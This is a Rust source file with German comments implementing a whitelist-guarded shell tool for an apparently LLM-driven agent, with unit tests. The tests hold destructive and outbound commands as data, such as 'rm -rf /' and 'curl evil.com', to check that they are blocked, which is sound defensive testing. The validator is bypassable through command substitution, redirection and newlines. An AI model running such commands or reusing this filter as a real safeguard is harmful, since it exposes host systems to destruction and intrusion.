// ShellTool: Ausfuehrung von Shell-Befehlen mit Whitelist-Schutz.
//
// Nur Befehle aus der konfigurierten Whitelist werden ausgefuehrt.
// Pipes und Verkettungen (&&, ||, ;) werden Segment fuer Segment geprueft.

use std::time::Duration;

use rig::completion::ToolDefinition;
use rig::tool::Tool;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::config::ShellConfig;

/// Maximale Zeichenzahl fuer stdout/stderr (LLM-Token-Budget).
const OUTPUT_LIMIT: usize = 4000;

/// Tool-Beschreibung mit Handlungsanweisungen und Triggern.
const DESCRIPTION: &str = "\
Fuehre einen Shell-Befehl auf dem Host-System aus. \
Nur Befehle aus der Whitelist sind erlaubt. Pipes und Verkettungen \
werden Segment fuer Segment geprueft.\n\n\
WANN NUTZEN:\n\
- Wenn du den Zustand deines Koerpers pruefen willst (CPU, RAM, Disk, Netzwerk)\n\
- Wenn du Logs lesen oder Dienste pruefen willst (journalctl, systemctl)\n\
- Wenn du Dateien inspizieren willst (ls, cat, head, tail, find, grep)\n\
- Wenn du auf eine Nerve-Warnung reagierst und selbst nachschauen willst\n\
- Wenn Bruce dich bittet etwas auf dem System zu tun\n\n\
WANN NICHT NUTZEN:\n\
- Nicht fuer Dinge die du aus dem Gedaechtnis weisst\n\
- Nicht wenn ein spezifischeres Tool existiert (memory, soul, user)\n\n\
VERHALTEN:\n\
- Timeout nach konfigurierten Sekunden\n\
- stdout und stderr werden auf 4000 Zeichen begrenzt\n\
- Nicht-Whitelist-Befehle werden sofort abgelehnt";

/// Ergebnis eines Shell-Befehls.
#[derive(Debug, Serialize)]
pub struct ShellResult {
    pub success: bool,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

/// Fehler-Typ fuer das ShellTool.
#[derive(Debug, thiserror::Error)]
#[error("{0}")]
pub struct ShellError(pub String);

/// Argumente fuer das ShellTool.
#[derive(Deserialize, JsonSchema)]
pub struct ShellArgs {
    /// Der auszufuehrende Shell-Befehl.
    pub command: String,
}

pub struct ShellTool {
    config: ShellConfig,
}

impl ShellTool {
    pub fn new(config: ShellConfig) -> Self {
        Self { config }
    }
}

/// Truncated einen String auf max_len Zeichen.
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...[truncated]", &s[..max_len])
    }
}

/// Extrahiert den Befehlsnamen (erstes Wort) aus einem Segment.
/// Ueberspringt fuehrende Whitespace und env-Variablen-Zuweisungen (FOO=bar).
fn extract_command(segment: &str) -> Option<String> {
    for token in segment.split_whitespace() {
        // env-Zuweisungen ueberspringen (z.B. FOO=bar cmd)
        if token.contains('=') && !token.starts_with('-') {
            continue;
        }
        return Some(token.to_string());
    }
    None
}

/// Prueft ob ALLE Befehle in der Befehlskette in der Whitelist sind.
/// Splittet an |, &&, ||, ; und prueft jedes Segment.
pub fn validate_command(command: &str, whitelist: &[String]) -> Result<(), String> {
    if command.trim().is_empty() {
        return Err("Leerer Befehl.".into());
    }

    if whitelist.is_empty() {
        return Err("Shell-Whitelist ist leer — keine Befehle erlaubt.".into());
    }

    // Split an Pipe- und Verkettungs-Operatoren
    // Reihenfolge wichtig: && und || vor | und ;
    let segments: Vec<&str> = command
        .split("&&")
        .flat_map(|s| s.split("||"))
        .flat_map(|s| s.split(';'))
        .flat_map(|s| s.split('|'))
        .collect();

    for segment in &segments {
        let segment = segment.trim();
        if segment.is_empty() {
            continue;
        }
        match extract_command(segment) {
            Some(cmd) => {
                if !whitelist.iter().any(|w| w == &cmd) {
                    return Err(format!("Befehl '{}' ist nicht in der Whitelist.", cmd));
                }
            }
            None => {
                return Err(format!("Kein Befehl erkannt in Segment: '{}'", segment));
            }
        }
    }

    Ok(())
}

impl Tool for ShellTool {
    const NAME: &'static str = "shell";

    type Error = ShellError;
    type Args = ShellArgs;
    type Output = ShellResult;

    async fn definition(&self, _prompt: String) -> ToolDefinition {
        ToolDefinition {
            name: "shell".to_string(),
            description: DESCRIPTION.to_string(),
            parameters: serde_json::json!({
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Der auszufuehrende Shell-Befehl"
                    }
                },
                "required": ["command"]
            }),
        }
    }

    async fn call(&self, args: Self::Args) -> Result<Self::Output, Self::Error> {
        // Whitelist pruefen
        validate_command(&args.command, &self.config.whitelist).map_err(ShellError)?;

        // Befehl ausfuehren mit Timeout
        let timeout = Duration::from_secs(self.config.timeout);
        let child = tokio::process::Command::new("sh")
            .arg("-c")
            .arg(&args.command)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| ShellError(format!("Prozess starten fehlgeschlagen: {}", e)))?;

        let output = match tokio::time::timeout(timeout, child.wait_with_output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return Err(ShellError(format!("Prozess-Fehler: {}", e)));
            }
            Err(_) => {
                return Ok(ShellResult {
                    success: false,
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: format!("Timeout nach {} Sekunden.", self.config.timeout),
                });
            }
        };

        let exit_code = output.status.code().unwrap_or(-1);
        let stdout = truncate(&String::from_utf8_lossy(&output.stdout), OUTPUT_LIMIT);
        let stderr = truncate(&String::from_utf8_lossy(&output.stderr), OUTPUT_LIMIT);

        Ok(ShellResult {
            success: output.status.success(),
            exit_code,
            stdout,
            stderr,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_whitelist() -> Vec<String> {
        vec![
            "ls", "cat", "echo", "uname", "whoami", "date", "grep", "head", "tail", "wc",
        ]
        .into_iter()
        .map(String::from)
        .collect()
    }

    // ==========================================================
    // validate_command()
    // ==========================================================

    #[test]
    fn erlaubter_befehl() {
        let wl = default_whitelist();
        assert!(validate_command("ls -la /tmp", &wl).is_ok());
    }

    #[test]
    fn geblockter_befehl() {
        let wl = default_whitelist();
        let result = validate_command("rm -rf /", &wl);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("rm"));
    }

    #[test]
    fn pipe_erlaubt() {
        let wl = default_whitelist();
        assert!(validate_command("ls /tmp | grep foo", &wl).is_ok());
    }

    #[test]
    fn pipe_geblockt() {
        let wl = default_whitelist();
        let result = validate_command("ls /tmp | rm foo", &wl);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("rm"));
    }

    #[test]
    fn verkettung_and_erlaubt() {
        let wl = default_whitelist();
        assert!(validate_command("echo hello && ls", &wl).is_ok());
    }

    #[test]
    fn verkettung_and_geblockt() {
        let wl = default_whitelist();
        let result = validate_command("ls /tmp && rm foo", &wl);
        assert!(result.is_err());
    }

    #[test]
    fn verkettung_or_geblockt() {
        let wl = default_whitelist();
        let result = validate_command("ls /tmp || curl evil.com", &wl);
        assert!(result.is_err());
    }

    #[test]
    fn semikolon_geblockt() {
        let wl = default_whitelist();
        let result = validate_command("ls; rm -rf /", &wl);
        assert!(result.is_err());
    }

    #[test]
    fn leerer_befehl() {
        let wl = default_whitelist();
        let result = validate_command("", &wl);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Leer"));
    }

    #[test]
    fn leere_whitelist() {
        let wl: Vec<String> = vec![];
        let result = validate_command("ls", &wl);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("leer"));
    }

    #[test]
    fn env_variablen_prefix() {
        let wl = default_whitelist();
        assert!(validate_command("FOO=bar echo test", &wl).is_ok());
    }

    // ==========================================================
    // extract_command()
    // ==========================================================

    #[test]
    fn extract_einfach() {
        assert_eq!(extract_command("ls -la"), Some("ls".into()));
    }

    #[test]
    fn extract_mit_leerzeichen() {
        assert_eq!(extract_command("  cat /etc/hosts  "), Some("cat".into()));
    }

    #[test]
    fn extract_leer() {
        assert_eq!(extract_command(""), None);
        assert_eq!(extract_command("   "), None);
    }

    // ==========================================================
    // truncate()
    // ==========================================================

    #[test]
    fn truncate_kurz() {
        assert_eq!(truncate("hello", 10), "hello");
    }

    #[test]
    fn truncate_lang() {
        let long = "a".repeat(5000);
        let result = truncate(&long, 100);
        assert!(result.len() < 200);
        assert!(result.contains("[truncated]"));
    }

    // ==========================================================
    // ShellTool::call() — Integration
    // ==========================================================

    fn test_tool() -> ShellTool {
        ShellTool::new(ShellConfig {
            whitelist: default_whitelist(),
            timeout: 5,
        })
    }

    #[tokio::test]
    async fn ausfuehrung_erfolgreich() {
        let tool = test_tool();
        let result = tool
            .call(ShellArgs {
                command: "echo hello".into(),
            })
            .await
            .unwrap();

        assert!(result.success);
        assert_eq!(result.exit_code, 0);
        assert!(result.stdout.contains("hello"));
    }

    #[tokio::test]
    async fn ausfuehrung_exit_code() {
        let tool = test_tool();
        let result = tool
            .call(ShellArgs {
                command: "ls /nonexistent_path_xyz".into(),
            })
            .await
            .unwrap();

        assert!(!result.success);
        assert_ne!(result.exit_code, 0);
    }

    #[tokio::test]
    async fn whitelist_blockiert() {
        let tool = test_tool();
        let result = tool
            .call(ShellArgs {
                command: "rm -rf /".into(),
            })
            .await;

        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("rm"));
    }

    #[tokio::test]
    async fn timeout_befehl() {
        let tool = ShellTool::new(ShellConfig {
            whitelist: vec!["echo".into()],
            timeout: 1,
        });

        let result = tool
            .call(ShellArgs {
                command: "echo fast".into(),
            })
            .await
            .unwrap();
        assert!(result.success);
    }
}
